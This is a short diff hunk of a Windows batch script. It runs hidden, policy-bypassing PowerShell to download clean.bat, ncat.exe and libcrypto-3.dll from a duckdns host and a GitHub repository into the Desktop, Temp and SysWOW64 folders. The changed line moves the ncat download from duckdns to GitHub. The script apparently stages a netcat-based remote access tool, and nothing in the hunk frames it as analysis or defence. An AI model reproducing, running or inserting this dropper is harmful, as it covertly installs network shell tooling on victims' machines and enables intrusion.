@@ -18,7 +18,7 @@ powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
 Invoke-WebRequest -Uri "http://shadingfile.duckdns.org/media/clean.bat" -OutFile "C:\Users\%USERNAME%\Desktop\clean.bat" > $null
 timeout /t 2 >nul
 powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
-Invoke-WebRequest -Uri "http://shadingfile.duckdns.org/media/ncat795/ncat.exe" -OutFile "C:\Windows\Temp\ncat.exe" > $null
+Invoke-WebRequest -Uri "https://github.com/Ax0my10rk/A/raw/refs/heads/main/ncat.exe" -OutFile "C:\Windows\Temp\ncat.exe" > $null
 powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
 Invoke-WebRequest -Uri "https://github.com/Ax0my10rk/A/raw/refs/heads/main/libcrypto-3.dll" -OutFile "C:\Windows\SysWOW64\libcrypto-3.dll" > $null
 powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
